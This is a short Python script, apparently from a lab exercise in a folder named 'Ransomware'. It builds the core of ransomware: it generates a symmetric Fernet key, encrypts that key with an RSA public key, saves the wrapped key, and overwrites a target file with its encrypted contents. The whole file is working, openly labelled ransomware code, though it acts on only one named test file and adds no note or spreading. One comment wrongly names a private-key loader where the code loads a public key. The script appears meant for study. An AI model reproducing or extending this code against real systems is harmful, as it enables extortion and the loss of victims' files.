from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

# "Fernet guarantees that a message encrypted using it cannot be maniplated
# or read without the key. Fernet is an implementation of symetric (also known
# as "secret key") authenticated cryptography."
# -- https://cryptography.io/en/latest/fernet/

# Fernet.generate_key() creates a fresh fernet key.
# Store this key somewhere secure!
symmetricKey  = Fernet.generate_key()


FernetInstance = Fernet(symmetricKey)


with open("/home/kali/Desktop/Ransomware/public_key.key", "rb") as key_file:
    # -- cryptography.hazmat.primitives.serialization.load_pem_private_key(data, password)
    # "Deserialize a private key from PEM encoded data to one of the supported asymmetric private key types"
    # Returns a private key; data type depends on the data passed.
    public_key = serialization.load_pem_public_key(
        # Passing the file's contents as the data field
        key_file.read(),
        # Using "default backend"
        backend=default_backend()
    )

    # Using the key generated above, we can

    encryptedSymmetricKey = public_key.encrypt (
        symmetricKey,
        padding.OAEP (mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None )
    )
    
    print("Symmetric Key")
    print(encryptedSymmetricKey)
    
with open("encryptedSymmertricKey.key", "wb") as key_file:
    key_file.write(encryptedSymmetricKey)

    filePath = "/home/kali/Desktop/Ransomware/FileToEncrypt.txt"

    with open(filePath, "rb") as file:
        file_data = file.read()
        encrypted_data = FernetInstance.encrypt(file_data)

    with open(filePath, "wb") as file:
        file.write(encrypted_data)

    quit()

"""

"""